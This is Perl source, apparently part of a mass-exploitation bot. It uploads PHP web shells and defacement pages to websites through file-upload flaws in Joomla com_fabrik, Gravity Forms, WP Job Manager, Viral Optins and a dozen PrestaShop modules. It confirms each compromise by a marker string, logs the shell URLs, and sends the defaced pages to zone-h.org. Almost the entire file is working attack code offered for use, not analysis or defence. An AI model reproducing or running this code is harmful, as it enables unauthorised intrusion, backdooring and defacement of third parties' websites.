##
$indfile="tools/spy.txt";
$shelfile="tools/cloud.php";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$shelfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$fabshell")->content;
if($checkfab =~/sohaip-hackerDZ/) {
    print color('bold green');
print  "[Sucess]\n";
    print color('reset');
        open (TEXT, '>>BOTV3/Shell3z.txt');
        print TEXT "[COM FABRIC] =>$fabshell \n";
        close (TEXT);
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

    }
}

sub indecomfabr(){
print"[Com Fabrik index] ................... ";

    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$indfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$def")->content;
if($checkfab =~/sohaip-hackerDZ/) {

    print color('bold green');
print  "[Sucess]\n";
    print color('reset');
zoneh();
            }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

                        }
}
######################
######################
######################
#####  Gravity  ######
######################
######################
######################
sub gravity(){
print"[Gravity] ............................ ";

$site = $_;
my $path = "/?gf_page=upload";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["11.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);
if ($exploit->decoded_content =~ /_input_3_css.php.jd/) {
  


my $check = $ua->get("$site/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$site/wp-includes/wp-footer.php")->content;
if($checkk =~/sohaip-hackerDZ/) {
print "[Success]\n";

    open(save, '>>BOTV3/Shell3z.txt');
  
    print save "$site/wp-includes/wp-footer.php\n";
  
    close(save);
}else {
     print color('bold red');
print "[Failed]\n";
    print color('reset');
}

  my $checkkk = $ua->get("$site/def.html")->content;
    if($checkkk =~m/sohaip-hackerDZ/i) {
  
    
        open(save, '>>BOTV3/index.txt');
        print save "$site/del.html\n";
        close(save);
  $def="$site/def.html";
  zoneh();
} 
}else {
     print color('bold red');
print "[Failed]\n";
    print color('reset');

}

  
}

  




sub upindex{
print"[Index gravity] ...................... ";
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "mrspybotv3.html"]);
if ($indexploit->decoded_content =~ /_input_3_mrspybotv3.html/) {
    $def= $site . '/_input_3_mrspybotv3.html';
      print color('bold green');
    print "[Sucess]\n$def\n";
    print color('reset');

    open(save, '>>BOTV3/index.txt');
    print save "[Gravity] : $def\n";
    close(save);
        zoneh();
       }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
       }
   }
######################
######################
######################
#####  job-mang   ######
######################
######################
######################

sub jombmang(){
print"[Job Manger Exploit] ................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link ="$site/jm-ajax/upload_file";
my $conte = $ua->get("$link")->content;
if($conte =~/{"files/) {
   
    print color("green"), "[vuln]";
    print color('reset');
    print " $site\n";
    open(save, '>>job.txt');
    print save "$site/post-a-job/\n";   
    close(save);
    tazz();
}else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');
  }

}

sub tazz(){
my $url = "$site/jm-ajax/upload_file/";
my $picture ="m.gif"; # Chaneg m.gif By Your PICTURE Name
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );

$def = $site. '/wp-content/uploads/job-manager-uploads/file/2017/09/m.gif'; # Chaneg m.gif By Your PICTURE Name
      $check = $ua->get($def)->status_line;
if ($check =~ /200/){
   print color('bold green');
print "[Success]\n";
    print color('reset');
print color('reset');
open(save, '>>BOTV3/index.txt');   
print save "$def\n";   
close(save);
zoneh();
}else{
print "[Failed]\n";
}
}

######################
######################
######################
#####  Presta   ######
######################
######################
######################
sub presta(){
print "[1] Try To Exploit ....\n";
$explone="$site/modules/columnadverts/uploadimage.php";
fuckone();
print "[2] Try To Exploit ....\n";
$exptow="$site/modules/simpleslideshow/uploadimage.php";
fucktow();
print "[3] Try To Exploit ....\n";
$expthre="$site/modules/productpageadverts/uploadimage.php";
fuckthre();
print "[4] Try To Exploit ....\n";
$expfor="$site/modules/homepageadvertise/uploadimage.php";
fuckfor();
print "[5] Try To Exploit ....\n";
$expfif="$site/modules/soopamobile/uploadimage.php";
fuckfif();
print "[6] Try To Exploit ....\n";
$expsix="$site/modules/homepageadvertise2/uploadimage.php";
fucksix();
print "[7] Try To Exploit ....\n";
$expsev="$site/modules/jro_homepageadvertise/uploadimage.php";
fucksev();
print "[8] Try To Exploit ....\n";
$expeyt="$site/modules/attributewizardpro/file_upload.php";
sirina();
print "[9] Try To Exploit ....\n";
$expnan="$site/modules/attributewizardpro.OLD/file_upload.php";
sirinaa();
print "[10] Try To Exploit ....\n";
$expng="$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
uppng();
print "[11] Try To Exploit ....\n";
$expngg="$site/modules/cartabandonmentpro/upload.php";
uppngg();
print "[12] Try To Exploit ....\n";
$expmp="$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
upmp();

}
####################################################################################
sub uppng(){
$png ="spyprestax.php.png";
my $res = $ua->post($expng, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php.png', name=>'qqfile', content => [ qqfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/advancedslider/uploads/spyprestax.php.png";
$shell ="$site/modules/attributewizardpro/file_uploads/spyprestax.php";
shekk();
}

####################################################################################
sub uppngg(){
$png ="spyprestax.php.png";
my $res = $ua->post($expngg, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php.png', name=>'image', content => [ image => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/cartabandonmentpro/uploads/spyprestax.php.png";
$shell ="$site/modules/cartabandonmentpro/uploads/spyprestax.php";
shekk();

}
#####################################################################################
sub upmp(){
$png ="spyprestax.php.mp4";
my $res = $ua->post($expmp, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php.png', name=>'qqfile', content => [ qqfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/videostab/uploads/spyprestax.php.png";
$shell ="$site/modules/videostab/uploads/spyprestax.php";
shekk();

}

##############################################
##############################################
##############################################
sub sirina(){
$png ="spyprestax.php.png";
my $res = $ua->post($expeyt, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php.png', name=>'userfile', content => [ userfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/attributewizardpro/file_uploads/spyprestax.php.png";
$shell ="$site/modules/attributewizardpro/file_uploads/spyprestax.php";
shekk();
}
####################
sub sirinaa(){
$png ="spyprestax.php.png";
my $res = $ua->post($expnan, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php.png', name=>'userfile', content => [ userfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scaning]\n";
$upl ="$site/modules/attributewizardpro.OLD/file_uploads/spyprestax.php";
$shell ="$site/modules/attributewizardpro.OLD/file_uploads/spyprestax.php";
shekk();
}
##############################################
##############################################
##############################################

sub fuckfif(){
$shlez = "spyprestax.php";
my $res = $ua->post($expfif, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/soopamobile/slides/spyprestax.php";
$shell ="$site/modules/soopamobile/slides/spyprestax.php";
shekk();
}else{
   print color('bold red');
print "$site ...Failed :(\n";
    print color('reset');
}
}
###############################################
sub fucksix(){
$shlez = "spyprestax.php";
my $res = $ua->post($expsix, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/homepageadvertise2/slides/spyprestax.php";
$shell ="$site/modules/homepageadvertise2/slides/spyprestax.php";
shekk();
}else{
   print color('bold red');
print "$site ...Failed :(\n";
    print color('reset');
}
}
################################
sub fucksev(){
$shlez = "spyprestax.php";
my $res = $ua->post($expsev, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/jro_homepageadvertise/slides/spyprestax.php";
$shell ="$site/modules/jro_homepageadvertise/slides/spyprestax.php";
shekk();
}else{
   print color('bold red');
print "$site ...Failed :(\n";
    print color('reset');
}
}
################################

###################### 

sub fuckone(){
$shlez = "spyprestax.php";
my $res = $ua->post($explone, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/columnadverts/slides/spyprestax.php";
$shell ="$site/modules/columnadverts/slides/spyprestax.php";
shekk();
}else{
   print color('bold red');
print "$site ...Failed :(\n";
    print color('reset');
}
}




########
sub fucktow(){
$shlez = "spyprestax.php";
my $res = $ua->post($exptow, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/simpleslideshow/slides/spyprestax.php";
$shell="$site/modules/simpleslideshow/slides/spyprestax.php";
shekk();
}else{
   print color('bold red');
print "$site ...Failed :(\n";
    print color('reset');
}
}
########
sub fuckthre(){
$shlez = "spyprestax.php";
my $res = $ua->post($expthre, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/productpageadverts/slides/spyprestax.php";
$shell="$site/modules/productpageadverts/slides/spyprestax.php";
shekk();
}else{
   print color('bold red');
print "$site ...Failed :(\n";
    print color('reset');
}
}
###########
sub fuckfor(){
$shlez = "spyprestax.php";
my $res = $ua->post($expfor, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'spyprestax.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/homepageadvertise/slides/spyprestax.php";
$shell="$site/modules/homepageadvertise/slides/spyprestax.php";
shekk();
}else{
   print color('bold red');
print "$site ...Failed :(\n";
    print color('reset');
}
}

######




######### check shell and index 

sub shekk(){
my $shcheck = $ua->get("$upl")->content;
if($shcheck =~/sohaip-hackerDZ/) {
   print color('bold red');
print "[Success]\n";
    print color('reset');


    open(save, '>>BOTV3/Shell3z.txt');   
    print save "$shell\n";   
    close(save);






}else{   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}
################virula####


#### not complete yet :( ....

sub virulaoption(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
print "trying ==> $site\n";
sub upza(){
my $url = "$site/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
my $filename ="s.txt"; 
my $filenamex = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $filenamex => ["$filename"] ]
           
            );
$upzzspy = $site. '/wp-content/uploads/2017/08/s.txt'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /sohaip-hackerDZ/){
   print color('bold green');
print "[Success]\n";
    print color('reset');
open(save, '>>BOTV3/index.txt');   
print save "$upzzspy\n";   
close(save);
}else{
print color('bold red');
print "...Failed :(\n";
    print color('reset');

}
    upza();
}
}
#######################

######################
######################
######################
#####  Zone-H   ######
######################
######################
######################
sub zoneh(){
print"[Zone-h Poster] ...................... ";

    open(save, '>>Result/index.txt');
    print save "$def\n";
    close(save);

                                $hack="sohaip-hackerDZ";
                                $zn="http://zone-h.org/notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
   print color('bold red');
print "[Failed]\n";
    print color('reset');

                                }
                                elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
   print color('bold green');
print "[Success]\n";
    print color('reset');



                                }
                                else
                                {
   print color('bold red');
print "[Failed]\n";
    print color('reset');
                                }
                            }
              
}
